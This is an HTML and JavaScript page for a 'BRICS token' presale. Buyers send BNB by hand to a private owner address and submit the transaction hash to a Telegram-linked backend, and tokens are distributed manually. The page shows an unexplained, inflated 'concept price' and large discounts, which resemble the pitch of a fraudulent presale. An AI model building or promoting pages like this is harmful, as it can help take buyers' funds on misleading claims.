<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <title>Buy BRICS Token</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <meta name="theme-color" content="#0b63ff"/>
    <style>
        :root{--bg:#f8fbff;--card:#fff;--primary:#0b63ff;--accent:#00b07a;--muted:#6b7280;}
        *{box-sizing:border-box}
        body{margin:0;font-family:Inter, "Arial", sans-serif;background:var(--bg);padding:20px;display:flex;justify-content:center;}
        .container{width:100%;max-width:980px}
        .card{background:var(--card);border-radius:14px;padding:18px;box-shadow:0 12px 30px rgba(11,99,255,0.06);display:flex;flex-direction:column;gap:12px}
        .hero{position:relative;border-radius:10px;overflow:hidden;height:160px;background:linear-gradient(90deg, rgba(11,99,255,0.06), rgba(0,176,122,0.03));}
        .hero img.map{width:100%;height:100%;object-fit:cover;display:block}
        .logo{position:absolute;left:50%;transform:translateX(-50%);top:12px;width:86px;height:86px;border-radius:50%;background:#fff;display:flex;align-items:center;justify-content:center;border:3px solid rgba(11,99,255,0.12);box-shadow:0 8px 20px rgba(11,99,255,0.08)}
        .logo img{width:68%;height:68%;object-fit:contain}
        h1{color:var(--primary);text-align:center;margin:6px 0 0;font-size:22px}
        .subtitle{text-align:center;color:#475569;font-weight:600;line-height:1.5}
        .contract-row{display:flex;gap:10px;align-items:center;justify-content:center;flex-wrap:wrap}
        .contract-box{background:linear-gradient(180deg,#f7fbff,#ffffff);padding:8px 12px;border-radius:10px;border:1px solid #eef5ff;font-weight:800;direction:ltr}
        .copy-btn{background:transparent;border:none;color:var(--primary);cursor:pointer;font-weight:800}
        .grid{display:grid;grid-template-columns:1fr 360px;gap:16px;margin-top:12px}
        @media(max-width:880px){.grid{grid-template-columns:1fr}}
        .panel{padding:12px;border-radius:12px;background:linear-gradient(180deg,#ffffff,#fcfeff);border:1px solid rgba(11,99,255,0.04)}
        .label{font-weight:800;color:#0e2546;margin-bottom:6px}
        .input-row{display:flex;gap:10px;align-items:center}
        .amount-input{flex:1;padding:12px;border-radius:10px;border:1px solid #e6eefb;font-size:16px;direction:ltr}
        .amount-input:focus{outline:none;box-shadow:0 6px 20px rgba(11,99,255,0.06);border-color:var(--primary)}
        .token-tag{min-width:96px;background:linear-gradient(90deg,#f3f7ff,#ffffff);border-radius:10px;padding:10px;text-align:center;font-weight:900}
        
        .price-info{margin-bottom:12px;font-size:14px;font-weight:700;}
        .price-info span.current-price{color:var(--accent);font-weight:900;}
        .price-info span.concept-price{color:var(--muted);text-decoration:line-through;margin-left:8px;}

        .calc-output{margin-top:10px;padding:10px;border-radius:10px;background:#f0f8ff;border:1px solid #eef6ff;font-weight:700;display:flex;justify-content:space-between;align-items:center;}
        .calc-output .label{margin-bottom:0;color:var(--primary);}
        .calc-output .value{font-size:16px;color:#0e2546;direction:ltr;}

        .memo{margin-top:12px;padding:10px;border-radius:10px;background:linear-gradient(180deg,#f6fbff,#ffffff);border:1px solid #eef6ff;font-weight:700;display:flex;justify-content:space-between;align-items:center}
        .wallet-card{padding:14px;border-radius:12px;background:linear-gradient(90deg,#f8fbff,#ffffff);border:1px solid rgba(11,99,255,0.04);display:flex;flex-direction:column;gap:10px;align-items:stretch}
        .wallet-top{display:flex;justify-content:space-between;align-items:center;gap:8px}
        .wallet-addr{font-weight:800;color:var(--primary);direction:ltr}
        
        .balances{display:flex;gap:8px;flex-direction:column;margin-top:6px}
        .bal-row{display:flex;justify-content:space-between;background:linear-gradient(180deg,#fff,#fbfeff);padding:8px 10px;border-radius:8px;border:1px solid #eef6ff;font-weight:800}
        .bal-row > div:last-child { direction:ltr; }
        
        .connect-btn{padding:12px;border-radius:12px;border:none;background:linear-gradient(90deg,#0b63ff,#2e8bff);color:#fff;font-weight:900; cursor:pointer; box-shadow:0 8px 20px rgba(11,99,255,0.12)}
        .connect-btn:disabled{opacity:0.6;cursor:not-allowed}

        .deposit-btn{margin-top:6px;padding:12px;border-radius:12px;border:none;cursor:pointer;font-weight:900;color:#fff;background:linear-gradient(90deg,#ff7a00,#ffb84d);box-shadow:0 10px 30px rgba(255,120,0,0.12)}
        .deposit-btn:disabled{opacity:0.5;cursor:not-allowed}
        .status{margin-top:10px;min-height:20px;font-weight:800;color:var(--muted);text-align:left;}
        .small{font-size:13px;color:var(--muted)}
        .footer-note{text-align:center;color:#475569;margin-top:8px}
        .modal-backdrop { position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.45);display:none;align-items:center;justify-content:center;z-index:9999; }
        .modal { background:#fff;padding:18px;border-radius:12px;max-width:520px;width:94%;box-shadow:0 10px 40px rgba(0,0,0,0.3); }
        .modal h3{margin:0 0 8px}
        .modal input{padding:10px;border-radius:8px;border:1px solid #ddd;font-size:14px;width:100%;margin-bottom:8px;}
        .modal .actions{display:flex;gap:8px;justify-content:flex-end;margin-top:8px}
        .btn{padding:10px 12px;border-radius:8px;border:none;cursor:pointer}
        .btn.primary{background:var(--primary);color:#fff}
        .btn.ghost{background:#f3f4f6}
        .note-small{font-size:12px;color:#555;margin-top:6px}

        .spinner{display:inline-block;width:16px;height:16px;border-radius:50%;border:3px solid rgba(0,0,0,0.08);border-top-color:var(--primary);animation:spin 1s linear infinite;vertical-align:middle;margin-left:8px;visibility:hidden;}
        .spinner.visible{visibility:visible;}
        @keyframes spin{to{transform:rotate(360deg)}}
    </style>
</head>
<body>
<div class="container">
  <div class="card" role="main">
    <div class="hero">
      <img class="map" src="brics-map.jpg" alt="BRICS map" />
      <div class="logo"><img src="bricslogo.png" alt="BRICS logo" /></div>
    </div>

    <h1>Buy BRICS Token</h1>
    <div class="subtitle">
      <p><strong>We are currently in the presale phase until February 2026.</strong><br>
      The price of each BRICS token is calculated at <strong>1 USD per BNB</strong>.<br>
      As the presale approaches its end, the discount percentage will automatically decrease.<br>
      After completing your transaction, copy the BRICS contract address and add it to your MetaMask wallet.</p>
    </div>

    <div class="contract-row">
      <div id="contractBox" class="contract-box">0xAF20...3037</div>
      <button id="copyContract" class="copy-btn">Copy</button>
    </div>

    <div class="grid">
      <div class="panel">
        
                <div class="label">Token Price</div>
        <div class="price-info">
          Concept Price: <span class="concept-price" id="conceptPriceText">$6.17</span>
          Presale Price: <span class="current-price" id="presalePriceText">$1.00</span>
          (<span id="bnbEquivalent">... BNB</span>)
          <span id="priceSpinner" class="spinner"></span>
        </div>

        <div class="label">Enter amount of BRICS to buy</div>
        <div class="input-row">
          <input id="bricsAmount" class="amount-input" type="number" min="1" max="2000000" placeholder="e.g. 1000" />
          <div class="token-tag">BRICS</div>
        </div>

                <div class="calc-output">
          <div class="label">Total BNB to Pay</div>
          <div class="value" id="totalBnbToPay">0.000 BNB</div>
        </div>

        <div class="memo">
          <div><strong>MEMO:</strong> <span id="memoTag">—</span></div>
          <button id="copyMemoBtn" class="copy-btn">Copy</button>
        </div>
      </div>

      <div class="wallet-card">
        <div class="wallet-top">
          <div>
            <div class="small">Buyer wallet</div>
            <div class="wallet-addr" id="walletAddr">—</div>
          </div>
          <div>
            <div class="small">Owner (receive BNB)</div>
            <div style="direction:ltr;font-weight:800;color:var(--primary)">0x6759...486cf</div>
          </div>
        </div>

        <button id="connectBtn" class="connect-btn">Connect Wallet</button>

        <div id="balances" style="display:none" class="balances">
          <div class="bal-row"><div>BNB Balance</div><div id="bnbBal">0.000 BNB</div></div>
        </div>

        <button id="depositBtn" class="deposit-btn" disabled>Deposited (Submit TX Hash)</button>
        <div id="status" class="status">Status: ready</div>
        <div class="footer-note">Accepted: <strong>BNB (BEP20)</strong> • Manual BRICS distribution after confirmation</div>
      </div>
    </div>
  </div>
</div>

<div id="modalBackdrop" class="modal-backdrop">
  <div class="modal">
    <h3>Paste your transaction hash</h3>
    <label>TX Hash (required)</label>
    <input id="modalTxHash" placeholder="0x..." />
    <label>Transaction link (optional)</label>
    <input id="modalTxLink" placeholder="https://bscscan.com/tx/..." />
    <p class="note-small">Make sure you sent BNB to the owner address and included the MEMO in your transfer.</p>
    <div class="actions">
      <button id="modalCancel" class="btn ghost">Cancel</button>
      <button id="modalSubmit" class="btn primary">Submit</button>
    </div>
  </div>
</div>

<script>
/* ================== CONFIG ================== */
const BRICS_CONTRACT="0xAF2009350F6ECBE22c23A505a590239c7aaA3037".toLowerCase();
const OWNER_ADDRESS="0x67594E1D30Cec8a5f906C8278A1BC694641486cf".toLowerCase();
const CHAIN_ID_BSC = 56;
const BRICS_CONCEPT_PRICE = 6.17; // 💡 The price for display (Concept Price)
const BRICS_PRESALE_PRICE = 1.00; // 💡 The price to calculate payment ($1.00)
const MIN_BRICS_BUY = 100; // Minimum BRICS amount for discount calculation
// Replace with your actual server endpoint and channel ID
const SERVER_ENDPOINT="/.netlify/functions/sendTelegram";
const CHANNEL_ID="-1003031571306";
/* ============================================ */

// DOM Elements
const contractBox=document.getElementById('contractBox');
const copyContract=document.getElementById('copyContract');
const bricsAmount=document.getElementById('bricsAmount');
const memoTag=document.getElementById('memoTag');
const copyMemoBtn=document.getElementById('copyMemoBtn');
const depositBtn=document.getElementById('depositBtn');
const walletAddr=document.getElementById('walletAddr');
const statusEl=document.getElementById('status');
const modalBackdrop=document.getElementById('modalBackdrop');
const modalTxHash=document.getElementById('modalTxHash');
const modalCancel=document.getElementById('modalCancel');
const modalSubmit=document.getElementById('modalSubmit');
const connectBtn = document.getElementById('connectBtn');
const bnbBal = document.getElementById('bnbBal');
const balancesDiv = document.getElementById('balances');
const totalBnbToPay = document.getElementById('totalBnbToPay');
const bnbEquivalent = document.getElementById('bnbEquivalent');
const priceSpinner = document.getElementById('priceSpinner');
const conceptPriceText = document.getElementById('conceptPriceText');
const presalePriceText = document.getElementById('presalePriceText');

// Global State
let provider = null, signer = null, user = null;
let bnbUsdPrice = 0; // Dynamic BNB price
let bricsPriceBNB = 0; // Presale Price ($1.00) equivalent in BNB

contractBox.textContent = short(BRICS_CONTRACT);
conceptPriceText.textContent = `$${BRICS_CONCEPT_PRICE.toFixed(2)}`;
presalePriceText.textContent = `$${BRICS_PRESALE_PRICE.toFixed(2)}`;

// Helpers
function short(a){return a?a.slice(0,6)+'...'+a.slice(-4):'—';}
function isMobile(){ return /Android|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i.test(navigator.userAgent); }
function setStatus(t, type=''){ statusEl.textContent = t; statusEl.className = 'status'; if(type) statusEl.classList.add(type); }
function genMemo(){return Math.random().toString(36).slice(2,12).toUpperCase();}

// Memo Logic
let currentMemo=genMemo();
memoTag.textContent=currentMemo;
copyMemoBtn.onclick=()=>navigator.clipboard.writeText(currentMemo);
copyContract.onclick=()=>navigator.clipboard.writeText(BRICS_CONTRACT);

// Deposit Modal Logic
depositBtn.onclick=()=>{
    const amt = Number(bricsAmount.value);
    if (!amt || amt < 1) {
        setStatus('Please enter the amount of BRICS you wish to buy.','error');
        return;
    }
    modalTxHash.value = '';
    modalBackdrop.style.display='flex';
};
modalCancel.onclick=()=>{modalBackdrop.style.display='none';};

modalSubmit.onclick=async()=>{
    const txHash=modalTxHash.value.trim();
    if(!txHash){
        setStatus('TX Hash is required!','error');
        return;
    }
    modalBackdrop.style.display='none';
    setStatus('Transaction submitted. Awaiting confirmation...','info');

    // 💡 Log the transaction information (Memo is crucial for matching)
    const payload={
        txHash,
        memo:currentMemo,
        wallet: user || 'unconnected',
        bricsAmount: bricsAmount.value,
        totalBNB: totalBnbToPay.textContent.replace(' BNB', ''),
        timestamp:new Date().toISOString(),
        channel_id:CHANNEL_ID
    };
    
    try {
        // Send data to backend (Netlify function/Telegram bot)
        const response = await fetch(SERVER_ENDPOINT,{
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body:JSON.stringify(payload)
        });

        if (response.ok) {
            setStatus('Transaction info sent to the server. BRICS will be sent soon. ✅');
            // Generate new memo after successful submission
            currentMemo = genMemo();
            memoTag.textContent = currentMemo;
        } else {
            setStatus('Submission failed. Contact support with your TX Hash.','error');
        }
    } catch (e) {
        setStatus('Submission failed due to network error. Contact support.','error');
        console.error('Submission error:', e);
    }
};

// ================== PRICE & CALCULATION LOGIC ==================

// Fetch dynamic BNB price and calculate BRICS_BNB equivalent
async function fetchBnbUsd(){
    const providerRpc = new ethers.providers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
    try{
        const res = await fetch("https://api.binance.com/api/v3/ticker/price?symbol=BNBUSDT");
        const j = await res.json();
        bnbUsdPrice = parseFloat(j.price);
        
        // Calculate Presale Price ($1.00) in BNB
        if (bnbUsdPrice > 0) {
            bricsPriceBNB = BRICS_PRESALE_PRICE / bnbUsdPrice;
            bnbEquivalent.textContent = `≈ ${bricsPriceBNB.toFixed(6)} BNB`;
        } else {
            bnbEquivalent.textContent = `(BNB Price Unavailable)`;
        }
        
        return bnbUsdPrice;
    }catch(e){ 
        console.error("fetchBnbUsd failed", e); 
        bnbUsdPrice = 0; 
        bnbEquivalent.textContent = `(Error fetching BNB price)`;
        throw e; 
    }
}

async function updatePrices(){
    priceSpinner.classList.add('visible');
    try {
        await fetchBnbUsd();
    } catch(e) {
        // Handled in fetchBnbUsd
    } finally {
        priceSpinner.classList.remove('visible');
        updateCalc();
    }
}
updatePrices();
setInterval(updatePrices, 15000); // Update every 15 seconds

// Discount logic: 100 -> 5% min, 1,000,000 -> 50% max
function calcDiscount(a){
    const n = Number(a);
    if(!n || n < MIN_BRICS_BUY) return 0;
    const maxA = 1000000;
    if(n >= maxA) return 50;
    const r = (n - MIN_BRICS_BUY) / (maxA - MIN_BRICS_BUY);
    return Math.round((5 + r * 45) * 100) / 100; // 5% minimum
}

// Update calculation preview (Total BNB to Pay)
function updateCalc(){
    const amt = Number(bricsAmount.value);
    
    if(!amt || !bricsPriceBNB || amt < 1){
        totalBnbToPay.textContent = '0.000 BNB';
        depositBtn.disabled = true;
        return;
    }

    const discount = calcDiscount(amt);
    
    // 1. Calculate discounted USD amount based on Presale Price ($1.00)
    const totalUSD = amt * BRICS_PRESALE_PRICE * (1 - discount/100); 
    
    // 2. Convert discounted USD amount to BNB
    const totalBNB = totalUSD / bnbUsdPrice;
    
    totalBnbToPay.textContent = `${totalBNB.toFixed(6)} BNB`;
    depositBtn.disabled = false;
    
    // For internal logging/debugging: console.log(`BRICS: ${amt}, Disc: ${discount}%, USD: ${totalUSD.toFixed(2)}, BNB: ${totalBNB.toFixed(6)}`);
}
bricsAmount.addEventListener('input', updateCalc);

// ================== WALLET CONNECT LOGIC ==================

async function connectWallet(){
    if(window.ethereum){
        // DESKTOP (Web3/Injected Provider)
        provider = new ethers.providers.Web3Provider(window.ethereum, "any");
        setStatus('Connecting to wallet...');
        try{
            const network = await provider.getNetwork();
            if(network.chainId !== CHAIN_ID_BSC){
                 await window.ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId: ethers.utils.hexValue(CHAIN_ID_BSC) }] });
            }
            await provider.send("eth_requestAccounts", []);
            signer = provider.getSigner();
            user = await signer.getAddress();
            walletAddr.textContent = short(user);
            connectBtn.textContent = `Connected: ${short(user)}`;
            connectBtn.disabled = true;
            setStatus('Wallet connected successfully ✅');
            await refreshBalances();
            // Setup listeners
            if(window.ethereum.on){
                window.ethereum.on('accountsChanged', (accounts) => { if(accounts && accounts.length) { user = accounts[0]; walletAddr.textContent = short(user); refreshBalances(); } else { user = null; walletAddr.textContent = '—'; balancesDiv.style.display = 'none'; connectBtn.disabled = false; connectBtn.textContent = 'Connect Wallet'; setStatus('Account disconnected'); }});
                window.ethereum.on('chainChanged', (chainId)=>{ setTimeout(()=>location.reload(),500) });
            }
        }catch(e){
            console.error(e);
            setStatus('Connection failed: '+(e.message||e), 'error');
        }
    } else {
        // MOBILE/NO PROVIDER
        if(isMobile()){
            // DEEP LINK to MetaMask mobile
            const href = window.location.href.replace(/^https?:\/\//,'');
            const link = `https://metamask.app.link/dapp/${href}`;
            setStatus('MetaMask not found — Attempting to open MetaMask mobile...');
            window.location.href = link;
        } else {
            // DESKTOP NO PROVIDER
            setStatus('MetaMask extension not found — Please install it to connect.', 'error');
            window.open('https://metamask.io/download.html', '_blank');
        }
    }
}

async function refreshBalances(){
    if(!provider || !user || bnbUsdPrice === 0) return;
    try{
        const rawBnb = await provider.getBalance(user);
        const bnb = parseFloat(ethers.utils.formatEther(rawBnb));
        bnbBal.textContent = `${bnb.toFixed(6)} BNB (~$${(bnb*bnbUsdPrice).toFixed(2)})`;
        balancesDiv.style.display = 'flex';
    }catch(e){
        console.error('refreshBalances error', e);
        setStatus('Failed to fetch BNB balance.', 'error');
    }
}

/* initial UI */
document.addEventListener('DOMContentLoaded', ()=>{
    setStatus('Ready — Please connect your wallet and enter BRICS amount');
});
connectBtn.addEventListener('click', connectWallet);
</script>
</body>
</html>
